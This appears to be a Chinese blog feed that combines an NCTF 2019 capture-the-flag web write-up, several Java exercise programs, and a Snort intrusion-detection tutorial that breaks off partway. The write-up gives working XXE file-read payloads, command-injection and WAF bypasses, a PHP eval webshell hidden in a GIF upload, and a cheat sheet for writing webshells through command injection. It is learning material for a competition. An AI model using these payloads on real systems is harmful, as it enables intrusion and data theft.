        <content type="html"><![CDATA[<h1 id="NCTF"><a href="#NCTF" class="headerlink" title="NCTF"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h3><p>简单的xxe</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id="ture-XML-cookbook"><a href="#ture-XML-cookbook" class="headerlink" title="ture XML cookbook"></a>ture XML cookbook</h3><p>常用的内网IP文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p><p><strong>requests</strong></p><pre><code>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p><pre><code>X-Powered-By: PHP/7.4.0RC6&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>解密：</p><pre><code>Main:  +-- 0.0.0.0/0 2 0 2 +-- 127.0.0.0/8 2 0 2+-- 127.0.0.0/31 1 0 0   |-- 127.0.0.0  /32 link BROADCAST  /8 host LOCAL   |-- 127.0.0.1  /32 host LOCAL|-- 127.255.255.255   /32 link BROADCAST +-- 173.225.150.0/24 2 0 2+-- 173.225.150.0/28 2 0 2   |-- 173.225.150.0  /32 link BROADCAST  /24 link UNICAST   |-- 173.225.150.9  /32 host LOCAL|-- 173.225.150.255   /32 link BROADCASTLocal:  +-- 0.0.0.0/0 2 0 2 +-- 127.0.0.0/8 2 0 2+-- 127.0.0.0/31 1 0 0   |-- 127.0.0.0  /32 link BROADCAST  /8 host LOCAL   |-- 127.0.0.1  /32 host LOCAL|-- 127.255.255.255   /32 link BROADCAST +-- 173.225.150.0/24 2 0 2+-- 173.225.150.0/28 2 0 2   |-- 173.225.150.0  /32 link BROADCAST  /24 link UNICAST   |-- 173.225.150.9  /32 host LOCAL|-- 173.225.150.255   /32 link BROADCAST</code></pre><p>照着Ip访问，吐槽我的windows下burp响应全是乱码，搞了半天去kali就没事了。</p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><pre><code>&lt;?phperror_reporting(0);highlight_file(__file__);$string_1 = $_GET[&apos;str1&apos;];$string_2 = $_GET[&apos;str2&apos;];$cmd = $_GET[&apos;q_w_q&apos;];//1stif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;}else{    die(&apos;23333333&apos;);}//2ndif(is_numeric($string_1)){    $md5_1 = md5($string_1);    $md5_2 = md5($string_2);    if($md5_1 != $md5_2){        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr — 查找字符串的首次出现，        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);        if($a == $b){            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;        }        else{            die(&quot;can u give me the right str???&quot;);        }    }     else{        die(&quot;no!!!!!!!!&quot;);    }}else{    die(&apos;is str1 numeric??????&apos;);}//3rd$query = $_SERVER[&apos;QUERY_STRING&apos;];if (strlen($cmd) &gt; 8){    die(&quot;too long :(&quot;);}if( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){    $arr = explode(&apos; &apos;, $cmd);          //explode — 使用一个字符串分割另一个字符串    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){        if(substr_count($cmd, &apos;cat&apos;) === 0){            system($cmd);        }        else{            die(&apos;ban cat :) &apos;);        }    }    else{        die(&apos;bad guy!&apos;);    }}else{    die(&apos;nonono _ is bad&apos;);}?&gt; </code></pre><p>第一层使用 %0a 截断绕过，第二层md5绕过<a href="https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83" target="_blank" rel="noopener">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> 前面几条0e开头的字符串去解密发现都收费，所以我们使用 <code>s878926199a</code> ,加密完解密得 <code>2120624</code> ，我们可以用数字绕过第一个判断，第三层 使用 <code>.</code> 绕过 <code>_</code> ，<code>%20</code> 替代空格，使用<code>l${x}s</code> 列目录，<code>tac%20f*</code> 读 <code>flag</code> .</p><p>看一个 <code>strstr()</code> 的例子</p><pre><code>$email  = &apos;name@example.com&apos;;$domain = strstr($email, &apos;@&apos;);echo $domain.&quot;\r\n&quot;; // 打印 @example.com$user = strstr($email, &apos;@&apos;, true); // 从 PHP 5.3.0 起echo $user.&quot;\r\n&quot;; // 打印 namevar_dump(&quot;01&quot;==true);输出：@example.comnamebool(true)</code></pre><p>payload:</p><pre><code>?num=23333%0a&amp;str1=2120624&amp;str2=s214587387a&amp;q.w.q=tac%20f*</code></pre><h3 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker backdoor"></a>hacker backdoor</h3><pre><code> &lt;?phperror_reporting(0);if(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){    highlight_file(__file__);}$code = $_GET[&apos;code&apos;];$usrful = $_GET[&apos;useful&apos;];function waf($a){    $dangerous = get_defined_functions();    //get_defined_functions — 返回所有已定义函数的数组    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //压入栈底    foreach ($dangerous[&quot;internal&quot;] as $bad) {        if(strpos($a,$bad) !== FALSE){        return False;        break;        }    }    return True;}if(file_exists($usrful)){    if(waf($code)){        eval($code);    }    else{        die(&quot;oh,不能输入这些函数哦 :) &quot;);    }}</code></pre><p>测试一下$dangerous</p><pre><code>&lt;?php  $dangerous = get_defined_functions();array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);foreach ($dangerous[&quot;internal&quot;] as $bad) {     if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){        echo &quot;badbad&quot;.&quot;\r\n&quot;;    }}?&gt;</code></pre><p>使用命令拼接绕过 waf()</p><pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;&amp;useful=index.php</code></pre><p>disable_functiongs:</p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>令执行利用及绕过姿势　　</p><p>写入webshell:</p><p>利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义，假设需要写入<?php eval($_POST[kang]); ?>，方法如下：<br>WINDOWS：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web可写目录加文件完整名字</p><p>linux下需要用\来转义&lt;，不过很多php都默认开启gpc（魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web可写目录加文件完整名字</p><p>| 命令管道符</p><p>&lt;&gt;&gt;&gt; 文件重定向符</p><p>测试： 0 | dir c:</p><p>　　代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</p><p>windows支持：</p><p>|     直接执行后面的语句      ping 127.0.0.1|whoami          </p><p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p><p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p><p>Linux支持(比上面多一个):</p><p>;     前面的执行完执行后面的      ping 127.0.0.1;whoami  </p><h3 id="upload-your-shell"><a href="#upload-your-shell" class="headerlink" title="upload your shell"></a>upload your shell</h3><p>打开题目在头像那里得 image 找到上传点，先上传</p><pre><code>&lt;?php     @eval($_POST[shell]);     ?&gt;</code></pre><p>提示 <code>&lt;?</code> ，然后直接拿上次 SUCTF 用剩下得马</p><pre><code>GIF89a&lt;script language=&apos;php&apos;&gt;    #system(&apos;cat /flag&apos;);    @eval($_POST[shell]);&lt;/script&gt;</code></pre><p>然后再修改 content-type ，传完得到图片路径，但是不能直接访问，观察到链接为 </p><pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>于是访问</p><pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>即可</p><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>文字替换工具，hint：<code>使用php5.6+bootstrap进行开发</code> ，猜测 <code>preg_replace</code> 的 <code>/e</code> 代码执行。</p><p>第三个框内的内容应该就是 /e的部分，我们输入 <code>var_dump(111)</code> ，成功打印 <code>int(111)</code> ，输入单引号双引号都会被过滤，可以利用 chr() 来绕过。</p><p>我们输入scandir(chr(47)) 发现列不了目录。直接读文件 </p><pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/2019/11/26/java-tests/"/>
      <url>/2019/11/26/java-tests/</url>
      
        <content type="html"><![CDATA[<h1 id="java-tests"><a href="#java-tests" class="headerlink" title="java-tests"></a>java-tests</h1><p>11/26/2019 9:26:49 AM </p><h2 id="charper-two"><a href="#charper-two" class="headerlink" title="charper two"></a>charper two</h2><ul><li>输入一个整数，输出阶乘最右边的非0数字</li></ul><pre><code>package the_second_chapter;import java.math.BigInteger;import java.util.Scanner;public class first_one {public static void main(String[] args) {    // TODO Auto-generated method stub    //int sum = 0,temp = 1;    BigInteger num = new BigInteger(&quot;1&quot;);    System.out.println(&quot;你想算多少的阶乘?&quot;);    Scanner scn = null;//防止 Scanner is never closed 的错误    try {        scn = new Scanner(System.in);        int num1 = scn.nextInt();        for(int number=1;number&lt;=num1;number++)        {            num = num.multiply(new BigInteger(number + &quot;&quot;));        }        System.out.println(num);    }    finally {        if(scn!=null)            scn.close();    }    char[] c = num.toString().toCharArray();                  System.out.println(num.toString().length());        //输出长度    for(int b=num.toString().length()-1;b&gt;=0;b--) {        //判断非0        if(c[b]!=&apos;0&apos;) {            System.out.println(c[b]);            return;        }    }}}</code></pre><blockquote><p>String.ToCharArray Method</p><p>Definition</p><p>Namespace: System</p><p>Assemblies: System.Runtime.dll, mscorlib.dll, netstandard.dll</p><p>Copies the characters in this instance(实例) to a Unicode character array.</p><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8</a></p></blockquote><ul><li>输入一组数字保存在数组中，遇到0表示输入结束，将输入的数组逆序输出</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_9 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner input=new Scanner(System.in);    int[] num=new int[20];    int i;    for(i=0;;i++)    {        int a=input.nextInt();        if(a==0)            break;        num[i]=a;    }    for(i=i-1;i&gt;=0;i--)    {        System.out.print(num[i]);        if(i!=0)            System.out.print(&quot; &quot;);    }    System.out.println();}}</code></pre><ul><li>超级递增序列</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_10 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scn = new Scanner(System.in);    int[] num = new int[20];    int i,flag=0;    int sum=0;    for(i=0;;i++) {        int a = scn.nextInt();        if(a==-999)            break;        num[i] = a;    }    for(int j=0;j&lt;num.length;j++) {        sum += num[j];        if(sum&lt;num[j+1])            flag=1;        else {            flag=2;            break;        }    if(flag==1) {        System.out.print(&quot;超级递增！&quot;);    }    else {        System.out.print(&quot;不是超级递增&quot;);    }    }}}</code></pre><ul><li>统计字符串中单词个数</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_11 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scanner = new Scanner(System.in);    String s = scanner.nextLine();    String []arr = s.split(&quot; &quot;);    int count = 0;    for (int i = 0;i&lt;arr.length;i++){        for (int j = i+1;j&lt;arr.length;j++){            if (arr[i].equals( arr[j])){                arr[j] = &quot; &quot;;            }        }    }    for (int i = 0;i&lt;arr.length;i++){        System.out.println(arr[i]);    }    for (int i = 0;i&lt;arr.length;i++){        if (arr[i] != &quot; &quot;){            count++;        }    }    System.out.println(count);}}</code></pre><h2 id="third-chapter"><a href="#third-chapter" class="headerlink" title="third_chapter"></a>third_chapter</h2><ul><li>修改文件名称</li></ul><pre><code>package third_chapter;import java.io.*;import java.util.*;public class test_4 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scn = new Scanner(System.in);    System.out.print(&quot;请输入旧文件路径及名称(D:\\test.txt)：&quot;);    String old_path = scn.next();    File old_file = new File(old_path);    System.out.print(&quot;请输入新文件名称(D:\\test1.txt)：&quot;);    String new_path = scn.next();    File new_file = new File(new_path);    if(old_file.exists() &amp;&amp; !new_file.exists()) {        old_file.renameTo(new_file);        System.out.print(&quot;reanme successful!&quot;);    }    else {        System.out.print(&quot;rename failue!&quot;);    }}}</code></pre><ul><li><p>实现copy命令</p><pre><code>package third_chapter;import java.io.*;import java.util.*;public class test_6 {public static void main(String[] args) throws FileNotFoundException {    // TODO Auto-generated method stub    try {    Scanner scn = new Scanner(System.in);    //输入文件名    System.out.print(&quot;请输入要复制的文件路径及名称：&quot;);    String old_file = scn.next();    FileReader old_one = new FileReader(old_file);   //创建文件对象    BufferedReader old_one_cont = new BufferedReader(old_one);//读文件    System.out.print(&quot;请输入要复制到的文件路径及名称：&quot;);    String new_file = scn.next();    FileWriter new_one = new FileWriter(new_file);   //创建文件对象    BufferedWriter new_one_cont = new BufferedWriter(new_one);//读文件    String content = null;    while((content = old_one_cont.readLine())!=null) {        new_one_cont.write(content);        new_one_cont.newLine();    }    //关闭文件    new_one_cont.flush();    new_one_cont.close();    new_one.close();    }    catch(IOException e) {        System.out.print(e.toString());    }}}</code></pre></li></ul><ul><li><p>实现删除注释功能</p><pre><code>package third_chapter;import java.io.*;import java.util.*;/** * @author brian * * @date: 2019年12月1日 上午10:57:42 * * @description: TODO * * @version: V1.0 * */public class test_8 {    /**     * @param args     * @throws FileNotFoundException      */    public static void main(String[] args) throws FileNotFoundException {        // TODO Auto-generated method stub        try {        Scanner scn = new Scanner(System.in);        System.out.println(&quot;请输入要删除注释的文件路径及文件名：&quot;);        String old_file = scn.next();        FileReader old_one = new FileReader(old_file);        BufferedReader old_cont = new BufferedReader(old_one);        System.out.print(&quot;请输入要复制到的文件路径及名称：&quot;);        String new_file = scn.next();        FileWriter new_one = new FileWriter(new_file);   //创建文件对象        BufferedWriter new_one_cont = new BufferedWriter(new_one);//读文件        String content = null;        while((content = old_cont.readLine())!=null) {            /**判断是否存在注释             * trim(): 将调用该方法的String的前后空格删除，返回新字符串             * indexOf(): 查找参数字符串在调用改方法的String中首次出现的位置，参数字符串不存在返回-1             * &amp; ：与运算，两边都是true时结果为true             * | ：或运算，两边任意一个为true，结果为true，都不是true，结果为false             */            if((content.trim().indexOf(&quot;//&quot;)==-1)&amp;(content.trim().indexOf(&quot;/*&quot;)==-1)&amp;(content.trim().indexOf(&quot;*/&quot;)==-1)) {                System.out.println(content);                new_one_cont.write(content);                new_one_cont.newLine();            }                //System.out.print(content+&quot;\n&quot;);        }        //关闭文件        new_one_cont.flush();        new_one_cont.close();        new_one.close();    } catch (IOException e) {            // TODO Auto-generated catch block        e.printStackTrace();    }}}</code></pre></li></ul><h2 id="six-chapter"><a href="#six-chapter" class="headerlink" title="six_chapter"></a>six_chapter</h2><ul><li><p>多线程打印线程号</p><pre><code>package sixth_chapter;/** * @author brian * * @date: 2019年12月1日 下午7:50:35 * * @description: TODO * * @version: V1.0 * */public class SecondThread implements Runnable{    /**     * @param args     */    public void run() {        for(int i=0;i&lt;5;i++) {            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+(char)(i+&apos;A&apos;));            try {                Thread.sleep(700);            }            catch(InterruptedException e) {                e.printStackTrace();            }        }    }    public static void main(String[] args) {        // TODO Auto-generated method stub    }}</code></pre></li></ul><pre><code>package sixth_chapter;//import FitstThread;//import SecondThread;/** * @author brian * * @date: 2019年12月1日 下午7:19:12 * * @description: TODO * * @version: V1.0 * */public class test_4 {    /**     * @param args     */    public static void main(String[] args) {        // TODO Auto-generated method stub        Runnable target = new SecondThread();        Thread t1 = new Thread(target);        Thread t2 = new Thread(target);        for(int i=0;i&lt;10;i++) {            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+i);            try {                Thread.sleep(700);            }            catch(InterruptedException e) {                e.printStackTrace();            }            if(i==1) t1.start();            if(i==2) t2.start();        }    }}</code></pre><ul><li>线程互斥</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java&#39;s things </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>snort 安全防御</title>
      <link href="/2019/11/24/snort-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1/"/>
      <url>/2019/11/24/snort-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="安全防御-snort"><a href="#安全防御-snort" class="headerlink" title="安全防御-snort"></a>安全防御-snort</h1><p>Snort IDS（入侵检测系统）是一个强大的网络入侵检测系统。它具有实时数据流量分析和记录IP网络数据包的能力，能够进行协议分析，对网络数据包内容进行搜索/匹配。它能够检测各种不同的攻击方式，对攻击进行实时报警。此外，Snort是开源的入侵检测系统，并具有很好的扩展性和可移植性。</p><h2 id="Snort-简介"><a href="#Snort-简介" class="headerlink" title="Snort 简介"></a>Snort 简介</h2><h3 id="snort体系结构"><a href="#snort体系结构" class="headerlink" title="snort体系结构"></a>snort体系结构</h3><p>Snort的结构由4大软件模块组成，它们分别是：</p><ol><li>数据包嗅探模块——负责监听网络数据包，对网络进行分；</li><li>预处理模块——该模块用相应的插件来检查原始数据包，从中发现原始数据的“行为”，如端口扫描，IP碎片等，数据包经过预处理后才传到检测引擎；</li><li>检测模块——该模块是Snort的核心模块。当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块；</li><li>报警/日志模块——经检测引擎检查后的Snort数据需要以某种方式输出。如果检测引擎中的某条规则被匹配，则会触发一条报警，这条报警信息会通过网络、UNIXsocket、WindowsPopu(SMB)、SNMP协议的trap命令传送给日志文件，甚至可以将报警传送给第三方插件（如SnortSam），另外报警信息也可以记入SQL数据库。</li></ol><h3 id="snort三种工作方式"><a href="#snort三种工作方式" class="headerlink" title="snort三种工作方式"></a>snort三种工作方式</h3><p>Snort拥有三大基本功能：嗅探器、数据包记录器和入侵检测。</p><ol><li>嗅探器模式仅从网络上读取数据包并作为连续不断的流显示在终端上，常用命令snort -v。使用这个命令将使snort只输出IP/TCP/UDP/ICMP的包头信息</li><li>数据包记录器模式是把数据包记录到硬盘上，常用命令snort –l 指定一个目录。这会将所有的包记录到硬盘上。</li><li>网络入侵检测模式是最复杂的，而且是可配置的。我们可以让Snort分析网络数据流以匹配用户定义的一些规则，并根据检测结果采取一定的动作。</li></ol><h2 id="如何使用0x01"><a href="#如何使用0x01" class="headerlink" title="如何使用0x01"></a>如何使用0x01</h2><h3 id="snort-规则定义"><a href="#snort-规则定义" class="headerlink" title="snort 规则定义"></a>snort 规则定义</h3><p>Snort使用一种简单的规则描述语言，这种描述语言易于扩展，功能也比较强大。<br>Snort规则是基于文本的，规则文件按照不同的组进行分类，比如，文件<code>ftp.rules</code>包含了FTP攻击内容。<br>「注」Snort的每条规则必须在一行中，它的规则解释器无法对跨行的规则进行解析。Snort的每条规则都可以分成逻辑上的两个部分：<strong>规则头和规则体</strong>。</p><p>规则头包括4个部分：<strong>规则行为；协议；源信息；目的信息</strong>。</p><p>snort规则头Snort预置的规则动作有5种：</p><ol><li>pass—动作选项pass将忽略当前的包，后继捕获的包将被继续分析。</li><li>log—动作选项log将按照自己配置的格式记录包。</li><li>alert—动作选项alert将按照自己配置的格式记录包，然后进行报警。它的功能强大，但是必须恰当的用，因为如果报警记录过多，从中攫取有效信息的工作量增大，反而会使安全防护工作变得低效。</li><li>dynamic—动作选项dynamic是比较独特的一种，它保持在一种潜伏状态，直到activate类型的规则将其触发，之后它将像log动作一样记录数据包。</li><li>activate—动作选项activate功能强大，当被规则触发时生成报警，并启动相关的dynamic类型规则。在检测复杂的攻击，或对数据进行归类时，该动作选项相当有用。除了以上5种预置的规则动作类型，用户还可以定制自己的类型。</li></ol><p>规则体的作用是在规则头信息的基础上进一步分析，有了它才能确认复杂的攻击(Snort的规则定义中可以没有规则体)。规则体由若干个被分别隔开的片断组成，每个片断定义了一个选项和相应的选项值。一部分选项是对各种协议的详细说明，包括IP、ICMP和TCP协议，其余的选项是：规则触发时提供给管理员的参考信息，被搜索的关键字，Snort规则的标识和大小写不敏感选项。下面是一个规则实例。</p><pre><code>alert tcp !192.168.43.0/24 any -&gt;any 21 (content:&quot;USER&quot;;msg: &quot;FTP Login&quot;;)</code></pre><ol><li><code>alert</code>表示规则动作为报警。                                         </li><li><code>tcp</code>表示协议类型为TCP协议。 </li><li><code>!192.168.0.1/24</code>表示源IP地址不是192.168.0.1/24。 </li><li>第一个<code>any</code>表示源端口为任意端口。                            </li><li><code>-&gt;</code>表示发送方向操作符，方向操作符左边的ip地址和端口号被认为是流来自的源主机</li><li>第二个any表示目的IP地址为任意IP地址。</li><li>21表示目的端口为21。 </li><li><code>content:&quot;USER&quot;</code>表示匹配的字符串为“USER”。      </li><li><code>msg:&quot;FTPLogin&quot;</code>表示报警信息为“FTPLogin”</li></ol><p>预处理器在调用检测引擎之前，在数据包被解码之后运行。通过这种机制，Snort可以以一种<code>out of band</code>的方式对数据包进行修改或者分析。<br>预处理器可以使用<code>preprocessor</code>关键词来加载和配置，常用到的预处理器如下:</p><ol><li><code>HTTPdecode</code>预处器HTTP解码预处理模块用来处理HTTPURL字符串，把它们转换为清晰的ASCII字符串。</li><li>端口扫描器<code>portscan</code>端口扫描器会把由单个源IP地址发起的端口扫描从开始到结束的全过程记录到标准日志。</li><li><code>stream</code>处理器stream处理器为snort提供了TCP数据包重组的功能。在配置的端口上，stream处理器能够对TCP数据包的细小片段进行重组，使之成为完整的TCP数据包，然后snort可以对其可疑行为进行检查。</li><li><code>frag2</code>处理器frag2预处理器为snort提供了IP分片重组的功能。frag2预处理器能够对分片包进行重组来定位分片攻击，它的工作原理是将所有的分片重组构造成一个包含完整信息的数据包，再将这个包传给检测引擎。</li></ol><h3 id="编写规则"><a href="#编写规则" class="headerlink" title="编写规则"></a>编写规则</h3><p>我们在使用开始前一定要注意选择好网卡，在snort.exe文件所在目录用<code>snort -W</code>查看系统可用网络接口。记住需要监视的网卡的编号，比如为2，那么在以后的使用中，用<code>-i 2</code>就可以选择对应的网卡。</p><p>我们先新建规则</p><pre><code>alert icmp any any -&gt; 192.168.43.137 any (msg:＂ICMP PING＂;sid:10000)</code></pre><p>ip地址是我的主机ip。这条规则的意思就是 对来自任何地址的<code>icmp</code>数据包发出警告信息.</p><p>执行命令：</p><pre><code>snort -i 2 -c ../etc/snort.conf -l ./log</code></pre><p>我们将编写的规则写入<code>snort.conf</code>中，在这里我们需要 <code>-c</code> 来指定我们用的规则，并将日志记录到 log 文件加中。</p><p>日志是二进制保存的，对于查看日志文件我们需要执行</p><pre><code>snort -dvr snort.log.xxxx</code></pre><h2 id="如何使用0x02"><a href="#如何使用0x02" class="headerlink" title="如何使用0x02"></a>如何使用0x02</h2><h3 id="使用-snort-检测局域网内-sqlmap-行为"><a href="#使用-snort-检测局域网内-sqlmap-行为" class="headerlink" title="使用 snort 检测局域网内 sqlmap 行为"></a>使用 snort 检测局域网内 sqlmap 行为</h3><p>先编写规则</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;sqlmap&quot;;sid=10000;classtype:webscan;rev=1)</code></pre><p>在 <code>classification.conf</code> 中添加 webscan 类型的规则</p><pre><code>config classfiction 描述，描述，危险等级config classification:shortname,short description,priorityconfig classification: webscan,webscan sqlmap,1</code></pre><p>在 <code>sid-msg.map</code> 中添加预定义描述</p><pre><code>10000 || webscan sqlmap detected || mcafee,98775</code></pre><p>本地起 dvwa 之后使用 low 级别的 sql注入 ，将payload放入sqlmap，随后打开snort进行监听发现了sqlmap行为。</p><p>但是这里存在问题，snort 在UA头里检测到了 sqlmap 字符串，然后打印了警告信息，这样的检测不够严谨，因为我们如果在 sql 注入的地方填入sqlmap它同样会触发 snort 警告。</p><p>我们修改原来的规则为</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;User-Agent: sqlmap/&quot;;sid=10000;classtype:webscan;rev=2)</code></pre><p>此时我们就能针对 UA 头进行监测(rev也加一，跟之前的记录进行区分)。</p><p>但是 sqlmap 其实可以绕过 UA 头的检测，我们在 sqlmap 中添加 <code>random-agent</code> 参数，就可以使用不同的 UA 。</p><p>另外，在使用规则时我们也可以通过添加多个 content 来进行检测：</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;and&quot;;content:&quot;=&quot;;sid=10001;classtype:webscan;rev=2)</code></pre><p>这样在匹配到两个关键词时就会触发警告。</p><p>对于其他的攻击，我们可以通过访问日志来抓取不同的请求，然后添加到对应的规则里。</p><p>除此之外，我们还可以制定一个依据访问频率的规则：</p><pre><code>alert any any -&gt; any any (msg:&quot;too many access&quot;;content:&quot;192.168.10.132/login.php&quot;;detection_filter:count 3, second 300,track 